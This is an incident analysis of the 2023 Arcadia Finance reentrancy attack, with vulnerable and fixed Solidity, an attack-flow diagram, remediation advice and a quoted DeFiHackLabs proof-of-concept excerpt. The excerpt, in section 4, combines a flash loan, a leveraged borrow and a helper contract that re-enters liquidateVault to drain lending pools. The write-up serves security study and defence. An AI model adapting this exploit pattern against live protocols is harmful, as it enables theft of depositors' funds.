# Arcadia Finance — Reentrancy Attack Analysis (2023)

| Field | Details |
|------|------|
| **Date** | 2023-07-10 |
| **Protocol** | Arcadia Finance |
| **Chain** | Optimism (and Ethereum Mainnet) |
| **Loss** | ~$400,000 USD |
| **Attacker** | [0xd364...9467](https://optimistic.etherscan.io/address/0xd3641c912a6a4c30338787e3c464420b561a9467) |
| **Attack Contract** | [0x01a4...3c6](https://optimistic.etherscan.io/address/0x01a4d9089c243ccaebe40aa224ad0cab573b83c6) |
| **Attack Tx** | [0xca7c...afe](https://optimistic.etherscan.io/tx/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe) |
| **Vulnerable Contract** | [0x13c0...109](https://optimistic.etherscan.io/address/0x13c0ef5f1996b4f119e9d6c32f5e23e8dc313109) (Vault implementation: [0x3ae3...bad](https://optimistic.etherscan.io/address/0x3ae354d7e49039ccd582f1f3c9e65034ffd17bad#code)) |
| **Root Cause** | `liquidateVault()` could be re-entered during the external callback execution of the vault's `vaultManagementAction()` without a reentrancy lock |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-07/ArcadiaFi_exp.sol) |

---

## 1. Vulnerability Overview

Arcadia Finance is a DeFi protocol that allows users to deposit on-chain assets (ERC20, NFTs, etc.) as collateral to obtain leveraged loans from a lending pool. Users deposit assets into a **Vault**, and the lending pool evaluates the vault's collateral value to extend credit.

The core vulnerability was that the vault's `vaultManagementAction()` function delegated arbitrary calls to an external `actionHandler` contract, and during that callback execution, the lending pool's `liquidateVault()` could be **re-entered**.

The attacker combined two vulnerabilities:

1. **Reentrancy vulnerability**: During `vaultManagementAction()` execution, the external callback could re-invoke `liquidateVault()`
2. **Flash loan leverage**: Large amounts of WETH and USDC were borrowed from Aave V3 to maximize collateral size, followed by a leveraged loan and fund extraction

As a result, the attacker drained both the WETH lending pool and the USDC lending pool using the same technique, stealing approximately $400,000.

---

## 2. Vulnerable Code Analysis

### 2.1 `vaultManagementAction()` — External Call Without Reentrancy Lock (Core Vulnerability)

**Vulnerable code (reconstructed)**:
```solidity
// ❌ Vulnerability: delegates arbitrary call to external actionHandler without nonReentrant
function vaultManagementAction(
    address actionHandler,
    bytes calldata actionData
) external returns (address, uint256) {
    // Calls external contract without updating collateral state
    // actionHandler can be an untrusted external address
    (bool success, bytes memory result) = actionHandler.call(
        abi.encodeWithSignature(
            "executeAction(bytes)",
            actionData
        )
    );
    require(success, "Action failed");

    // ❌ Problem: no mechanism to prevent reentrancy during the above external call
    // ❌ State is settled only after the external call — violates CEI pattern
    return abi.decode(result, (address, uint256));
}
```

**Fixed code**:
```solidity
// ✅ Reentrancy blocked by adding nonReentrant modifier
bool private _locked;

modifier nonReentrant() {
    require(!_locked, "ReentrancyGuard: reentrant call detected");
    _locked = true;
    _;
    _locked = false;
}

function vaultManagementAction(
    address actionHandler,
    bytes calldata actionData
) external nonReentrant returns (address, uint256) {
    // ✅ External call performed under reentrancy lock
    (bool success, bytes memory result) = actionHandler.call(
        abi.encodeWithSignature(
            "executeAction(bytes)",
            actionData
        )
    );
    require(success, "Action failed");
    return abi.decode(result, (address, uint256));
}
```

**Issue**: While `vaultManagementAction()` transfers control to the external `actionHandler`, there is no reentrancy lock. During this external call, an attacker can invoke `liquidateVault()` to liquidate the vault. Since the vault's debt state has not yet been settled at the time of liquidation, more assets than the collateral can be withdrawn.

---

### 2.2 `doActionWithLeverage()` — State Settlement Ordering Issue After Leveraged Loan

**Vulnerable code (reconstructed)**:
```solidity
// ❌ Vulnerability: funds transferred to external call without vault state validation after leveraged loan
function doActionWithLeverage(
    uint256 amountBorrowed,
    address vault,
    address actionHandler,
    bytes calldata actionData,
    bytes3 referrer
) external {
    // 1. Transfer loan amount from lending pool to vault
    _transferTokens(vault, amountBorrowed);

    // 2. Delegate control to vault's action handler
    // ❌ At this point the vault holds borrowed funds but debt may not yet be recorded
    IVault(vault).vaultManagementAction(actionHandler, actionData);

    // 3. Record debt and validate collateral ratio (too late)
    _processDebt(vault, amountBorrowed);
    require(_isVaultSolvent(vault), "Vault undercollateralized");
}
```

**Fixed code**:
```solidity
// ✅ State settled before external call (CEI pattern)
function doActionWithLeverage(
    uint256 amountBorrowed,
    address vault,
    address actionHandler,
    bytes calldata actionData,
    bytes3 referrer
) external nonReentrant {
    // 1. Record debt first (Checks-Effects)
    _processDebt(vault, amountBorrowed);

    // 2. Transfer loan amount
    _transferTokens(vault, amountBorrowed);

    // 3. Execute external action (Interactions)
    IVault(vault).vaultManagementAction(actionHandler, actionData);

    // 4. Validate collateral ratio
    require(_isVaultSolvent(vault), "Vault undercollateralized");
}
```

---

### 2.3 `liquidateVault()` — Debt Inconsistency When Called During Reentrancy

**Issue**: `liquidateVault()` pays the vault's current collateral to the liquidator and burns the debt. However, when this function is re-entered during the `vaultManagementAction()` callback, the assets that were in the vault (including leveraged borrowed funds) may have already been moved to the attacker's helper contract via `ActionMultiCall`. Therefore, even if the vault's collateral is near zero at the time of liquidation, the lending pool processes it as a normal liquidation, burns the debt, and the attacker escapes without repaying the loan.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker pre-deploys Helper1 and Helper2 helper contracts (dynamically created within the attack transaction in the PoC)
- Implements Aave V3 flash loan callback (`executeOperation`)
- Attack executed at Optimism block 106,676,494

### 3.2 Execution Phase

**WETH drain flow:**

```
┌─────────────────────────────────────────────────────────────────────┐
│ 1. Attacker → Aave V3.flashLoan()                                    │
│    Flash loan request: WETH ~29.85 ETH, USDC ~11,916 USDC            │
└────────────────────────────┬────────────────────────────────────────┘
                             │ callback invoked
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 2. executeOperation() executes                                       │
│    → calls WETHDrain()                                               │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 3. Factory.createVault(salt=15113)                                   │
│    → Proxy1 vault created                                            │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 4. Proxy1.openTrustedMarginAccount(darcWETH)                         │
│    → Links vault to WETH lending pool                                │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 5. Proxy1.deposit(WETH, ~29.85 ETH)                                  │
│    → Deposits flash-loaned WETH into vault as collateral             │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 6. darcWETH.doActionWithLeverage(                                    │
│      amountBorrowed = darcWETH total balance - 1 ETH,                │
│      vault = Proxy1,                                                 │
│      actionHandler = ActionMultiCall                                 │
│    )                                                                 │
│    → Leveraged loan of entire lending pool WETH into vault           │
│    → ActionMultiCall executes WETH.approve(Proxy1, max)              │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 7. Deploy Helper1 helper contract (target = Proxy1)                  │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 8. Proxy1.vaultManagementAction(ActionMultiCall, callData2)          │
│    callData2 contents:                                               │
│      [1] WETH.approve(helper, max)    ← executed via ActionMultiCall │
│      [2] helper.rekt()               ← core reentrancy trigger       │
└────────────────────────────┬────────────────────────────────────────┘
                             │ helper.rekt() executes
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 9. Helper1.rekt() — reentrancy attack executed                       │
│    [a] WETH.transferFrom(ActionMultiCall, attacker, full balance)    │
│        → Transfers all WETH borrowed from lending pool to attacker   │
│    [b] darcWETH.liquidateVault(Proxy1)  ← reentrancy!               │
│        → Liquidates empty vault → burns debt (without collateral)    │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 10. USDCDrain() drains USDC lending pool using the same method       │
│     (using Proxy2, darcUSDC, Helper2)                                │
└────────────────────────────┬────────────────────────────────────────┘
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────────┐
│ 11. Repay Aave V3 flash loan (WETH + USDC + fees)                    │
│     → Remaining WETH/USDC = net profit (~$400K)                      │
└─────────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Asset | Amount Stolen |
|------|----------|
| WETH | Entire darcWETH lending pool (net profit excluding 29.85 ETH flash loan) |
| USDC | Entire darcUSDC lending pool (net profit excluding 11,916 USDC flash loan) |
| **Total** | **~$400,000 USD** |

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// =========================================================
// Core attack logic excerpt — ArcadiaFi_exp.sol
// =========================================================

// [Step 1] Initiate attack via Aave V3 flash loan
function testExploit() external {
    address[] memory assets = new address[](2);
    assets[0] = address(WETH);   // ~29.85 ETH
    assets[1] = address(USDC);   // ~11,916 USDC

    uint256[] memory amounts = new uint256[](2);
    amounts[0] = 29_847_813_623_947_075_968;
    amounts[1] = 11_916_676_700;

    // mode=0: flash loan (repayment required)
    uint256[] memory modes = new uint256[](2);
    aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
}

// [Step 2] Execute drain in flash loan callback
function executeOperation(...) external returns (bool) {
    WETH.approve(address(aaveV3), type(uint256).max);
    USDC.approve(address(aaveV3), type(uint256).max);
    WETHDrain(assets[0], amounts[0]);   // Drain WETH lending pool
    USDCDrain(assets[1], amounts[1]);   // Drain USDC lending pool
    return true;
}

// [Step 3] Core WETH drain logic
function WETHDrain(address targetToken, uint256 tokenAmount) internal {
    // Create vault → open margin account → deposit collateral
    Proxy1 = IVault(Factory.createVault(15_113, uint16(1), targetToken));
    Proxy1.openTrustedMarginAccount(address(darcWETH));
    Proxy1.deposit(/* WETH, tokenAmount */);

    // Leveraged loan of entire lending pool balance (via ActionMultiCall)
    darcWETH.doActionWithLeverage(
        WETH.balanceOf(address(darcWETH)) - 1e18,  // nearly full balance
        address(Proxy1),
        address(ActionMultiCall),
        callData1,   // executes WETH.approve(Proxy1, max)
        bytes3(0)
    );

    // Deploy helper contract (reentrancy trigger)
    Helper1 helper = new Helper1(address(Proxy1));

    // [Core] helper.rekt() called from vaultManagementAction → reentrancy
    Proxy1.vaultManagementAction(
        address(ActionMultiCall),
        callData2   // [1] WETH approve to helper, [2] call helper.rekt()
    );
}

// [Step 4] Reentrancy attack — Helper1.rekt()
contract Helper1 {
    function rekt() external {
        // At the point of reentrancy, vault funds are held in ActionMultiCall
        // → Transfer all WETH to attacker address
        WETH.transferFrom(ActionMultiCall, owner, WETH.balanceOf(address(ActionMultiCall)));

        // → Liquidate empty vault (burn debt, no collateral returned)
        darcWETH.liquidateVault(proxy);   // ← reentrancy!
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern | Similar Cases |
|----|--------|--------|-----|-----------|-----------|
| V-01 | Vault action handler reentrancy | CRITICAL | CWE-841 | `01_reentrancy.md` - Pattern 2 (Cross-Function) | Fei/Rari 2022 ($80M) |
| V-02 | Untrusted external call delegation | HIGH | CWE-829 | `03_access_control.md` | Cream Finance 2021 ($130M) |
| V-03 | Flash loan leverage collateral inflation | MEDIUM | CWE-20 | `02_flash_loan.md` | bZx 2020 |
| V-04 | State settlement ordering error during leveraged loan | HIGH | CWE-362 | `16_accounting_sync.md` | Euler Finance 2023 |

---

### V-01: Vault Action Handler Reentrancy (Cross-Function Reentrancy)

- **Description**: `vaultManagementAction()` delegates control to an untrusted `actionHandler` without applying a `nonReentrant` lock, allowing `liquidateVault()` to be re-invoked during the callback.
- **Impact**: Attacker can drain the entire lending pool without repaying the loan.
- **Attack Conditions**: (1) Attacker owns the vault, (2) `ActionMultiCall` contract executes arbitrary external calls, and (3) no reentrancy lock is present.

---

### V-02: Untrusted External Call Delegation

- **Description**: The `ActionMultiCall` contract executes arbitrary `(address, bytes)` pairs as external calls. By including a malicious contract address and `rekt()` signature in attacker-supplied calldata, arbitrary code execution was possible.
- **Impact**: Attacker-controlled code executes in the vault context, enabling fund transfers and reentrancy triggering.
- **Attack Conditions**: `ActionMultiCall` allows calls to arbitrary addresses without a whitelist.

---

### V-03: Flash Loan Leverage Collateral Inflation

- **Description**: Assets received via flash loan are deposited as collateral, then leveraged borrowing accumulates far more assets in the vault than their actual value, minimizing the attack capital requirement.
- **Impact**: Creates economic conditions where the entire lending pool can be drained with minimal personal capital.
- **Attack Conditions**: Access to a flash loan provider (Aave V3), and the vault system accepts flash-loaned assets as collateral.

---

### V-04: State Settlement Ordering Error During Leveraged Loan

- **Description**: `doActionWithLeverage()` records debt and validates the collateral ratio after executing the external action. This violates the Checks-Effects-Interactions (CEI) pattern, leaving a window for state manipulation during the external call.
- **Impact**: Opens the fundamental possibility for reentrancy attacks.
- **Attack Conditions**: State changes in `doActionWithLeverage()` occur after the external call.

---

## 6. Remediation Recommendations

### Immediate Actions

#### 1. Add `nonReentrant` to All Functions with External Calls

```solidity
// Inherit OpenZeppelin ReentrancyGuard and apply
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    // ✅ Reentrancy protection
    function vaultManagementAction(
        address actionHandler,
        bytes calldata actionData
    ) external nonReentrant returns (address, uint256) {
        // ...
    }
}

contract LendingPool is ReentrancyGuard {
    // ✅ Reentrancy protection
    function doActionWithLeverage(
        uint256 amountBorrowed,
        address vault,
        address actionHandler,
        bytes calldata actionData,
        bytes3 referrer
    ) external nonReentrant {
        // ...
    }

    // ✅ Reentrancy protection
    function liquidateVault(address vault) external nonReentrant {
        // ...
    }
}
```

#### 2. Apply CEI (Checks-Effects-Interactions) Pattern

```solidity
function doActionWithLeverage(...) external nonReentrant {
    // ✅ [Checks] Pre-validate collateral ratio
    require(_isVaultSolvent(vault), "Pre-check: undercollateralized");

    // ✅ [Effects] Record debt first
    _processDebt(vault, amountBorrowed);

    // ✅ [Interactions] External calls last
    _transferTokens(vault, amountBorrowed);
    IVault(vault).vaultManagementAction(actionHandler, actionData);

    // ✅ Post-validate collateral ratio
    require(_isVaultSolvent(vault), "Post-check: undercollateralized");
}
```

#### 3. Apply Whitelist to ActionMultiCall

```solidity
// ❌ Allows arbitrary address calls (current)
for (uint i = 0; i < to.length; i++) {
    (bool success,) = to[i].call(data[i]);
}

// ✅ Only whitelisted addresses allowed
mapping(address => bool) public allowedTargets;

for (uint i = 0; i < to.length; i++) {
    require(allowedTargets[to[i]], "Target address not allowed");
    (bool success,) = to[i].call(data[i]);
    require(success, "Call failed");
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Vault reentrancy (V-01) | Apply `nonReentrant` universally to both vault and lending pool contracts. Design a global lock to account for cross-contract reentrancy |
| Untrusted external calls (V-02) | Restrict ActionMultiCall's allowed target addresses to a governance-managed whitelist. Apply timelock when changing external contract addresses |
| Flash loan collateral (V-03) | Implement flash loan origin detection or per-block deposit limits to restrict depositing flash-loaned assets as collateral within the same transaction |
| State settlement ordering (V-04) | Enforce CEI pattern in all lending functions. Complete all state changes before external calls. Add CEI item to code review checklist |
| Audit scope | Comprehensive reentrancy path analysis for all functions involving external contract calls. Introduce formal audit and fuzz testing |

---

## 7. Lessons Learned

1. **Reentrancy is not limited to direct recursion**: In this incident, reentrancy occurred via the cross-function path `vaultManagementAction → helper.rekt() → liquidateVault()`. Even without a direct recursive call like `withdraw()`, any state-changing function that includes an external call must be evaluated for reentrancy risk.

2. **Do not delegate control to untrusted external calls**: The very design of `ActionMultiCall` allowing arbitrary address calls opened the attack vector. General-purpose multicall contracts must explicitly restrict allowed targets, or their use must be segregated from sensitive contexts (vault management, leveraged borrowing).

3. **CEI pattern is mandatory, not optional**: Because `doActionWithLeverage()` recorded debt after the external call, state inconsistency arose during reentrancy. The Check → Effect → Interaction ordering is a fundamental principle of DeFi protocol coding and must always be enforced through code review and static analysis tools.

4. **Flash loans lower the economic barrier to attack**: The attacker inflated collateral via flash loan with no personal capital to drain the entire lending pool. Protocols must recognize the risk of accepting flash-loaned assets as collateral within the same transaction, and consider introducing block delays (deposit-to-borrow delay) or flash loan origin detection.

5. **Clearly separate vault owner permissions from the lending pool trust model**: A design where vault owners can specify arbitrary action handlers and access lending pool funds is inherently dangerous. If the lending pool trusts the vault, it must verify the external code the vault executes to an equivalent degree.

6. **The same attack vectors exist on L2s like Optimism**: The cheaper and faster characteristics of L2 also work in the attacker's favor. The same security principles must be applied regardless of chain.

---

## 8. On-Chain Verification

> On-chain verification was performed based on publicly available post-mortems and PoC code.

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | PoC Value | Reference |
|------|--------|----------|
| Flash loan WETH | 29,847,813,623,947,075,968 wei (~29.85 ETH) | PoC `amounts[0]` |
| Flash loan USDC | 11,916,676,700 (~11,916 USDC) | PoC `amounts[1]` |
| Total stolen | ~$400,000 USD | `@KeyInfo` comment |
| Attack block | 106,676,494 (Optimism) | `vm.createSelectFork` |

### 8.2 Key On-Chain Addresses

| Role | Address |
|------|------|
| Attacker EOA | [0xd3641c912a6a4c30338787e3c464420b561a9467](https://optimistic.etherscan.io/address/0xd3641c912a6a4c30338787e3c464420b561a9467) |
| Attack contract | [0x01a4d9089c243ccaebe40aa224ad0cab573b83c6](https://optimistic.etherscan.io/address/0x01a4d9089c243ccaebe40aa224ad0cab573b83c6) |
| Vulnerable vault factory | [0x00CB53780Ea58503D3059FC02dDd596D0Be926cB](https://optimistic.etherscan.io/address/0x00CB53780Ea58503D3059FC02dDd596D0Be926cB) |
| darcWETH lending pool | [0xD417c28aF20884088F600e724441a3baB38b22cc](https://optimistic.etherscan.io/address/0xD417c28aF20884088F600e724441a3baB38b22cc) |
| darcUSDC lending pool | [0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d](https://optimistic.etherscan.io/address/0x9aa024D3fd962701ED17F76c17CaB22d3dc9D92d) |
| ActionMultiCall | [0x2dE7BbAAaB48EAc228449584f94636bb20d63E65](https://optimistic.etherscan.io/address/0x2dE7BbAAaB48EAc228449584f94636bb20d63E65) |
| Vault implementation (vulnerable) | [0x3ae354d7e49039ccd582f1f3c9e65034ffd17bad](https://optimistic.etherscan.io/address/0x3ae354d7e49039ccd582f1f3c9e65034ffd17bad#code) |
| Attack Tx | [0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe](https://optimistic.etherscan.io/tx/0xca7c1a0fde444e1a68a8c2b8ae3fb76ec384d1f7ae9a50d26f8bfdd37c7a0afe) |

### 8.3 Reference Links

- **Post-mortem**: https://arcadiafinance.medium.com/post-mortem-72e9d24a79b0
- **Phalcon analysis**: https://twitter.com/Phalcon_xyz/status/1678250590709899264
- **PeckShield analysis**: https://twitter.com/peckshield/status/1678265212770693121
- **PoC reproduction**: `forge test --contracts ./src/test/2023-07/ArcadiaFi_exp.sol -vvv`